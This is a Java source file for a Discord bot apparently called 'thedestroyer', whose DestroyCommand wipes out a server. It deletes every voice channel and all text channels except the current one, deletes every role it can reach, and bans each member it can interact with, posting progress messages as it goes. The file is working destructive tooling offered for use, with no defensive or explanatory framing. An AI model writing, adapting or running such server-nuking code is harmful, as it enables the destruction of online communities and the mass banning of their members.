package xyz.yarinlevi.thedestroyer.commands;

import net.dv8tion.jda.api.entities.*;
import xyz.yarinlevi.thedestroyer.Main;
import xyz.yarinlevi.thedestroyer.utils.ChannelUtils;
import xyz.yarinlevi.thedestroyer.utils.Command;
import xyz.yarinlevi.thedestroyer.utils.MemberUtils;
import xyz.yarinlevi.thedestroyer.utils.RoleUtils;

import java.util.HashMap;
import java.util.Iterator;
import java.util.List;

public class DestroyCommand extends Command {
    public DestroyCommand(String name) {
        super(name);
    }

    @Override
    public void run(HashMap<String, Object> data, String[] args) {
        Guild guild = (Guild) data.get("guild");
        MessageChannel channel = (MessageChannel) data.get("messageChannel");
        User user = (User) data.get("user");

        List<Member> memberListLoaded = guild.loadMembers().get();

        // Channel deletion
        int interactableChannels = ChannelUtils.countInteractableChannels(guild);
        int interactedChannels = 1;

        if (interactableChannels != 0) {
            for (VoiceChannel voiceChannel : guild.getVoiceChannels()) {
                interactedChannels++;
                voiceChannel.delete().queue();
            }

            channel.sendMessage("Deleted all voice channels..").queue();

            for (TextChannel textChannel : guild.getTextChannels()) {
                if (textChannel != channel) {
                    interactedChannels++;
                    textChannel.delete().queue();
                }
            }

            channel.sendMessage("Deleted all text channels except this one..").queue();
        }

        // Role deletion
        int interactableRoles = RoleUtils.countInteractableRoles(guild);
        int interactedRoles;

        if (interactableRoles != 0) {
            for (Role role : guild.getRoles()) {
                if (guild.getSelfMember().canInteract(role)) {
                    if (!role.isManaged() && !role.isPublicRole()) {
                        interactableRoles++;
                        channel.sendMessage("Deleting role " + role.getName() + "!").queue();
                        role.delete().queue();
                    }
                }
            }
        }

        // User banning
        int interactableMembers = MemberUtils.countInteractableMembers(guild);
        int interactedMembers = 0;

        channel.sendMessage("Banning user #" + interactedMembers + " out of " + interactableMembers).queue();

        Member self = guild.getMember(Main.instance.getUser());

        if (interactableMembers != 0) {
            for (Member mem : memberListLoaded) {
                interactedMembers++;
                if (self.canInteract(mem)) {
                    MemberUtils.quickBan(mem, "Banned user #" + interactedMembers);
                }
            }
        }
    }
}
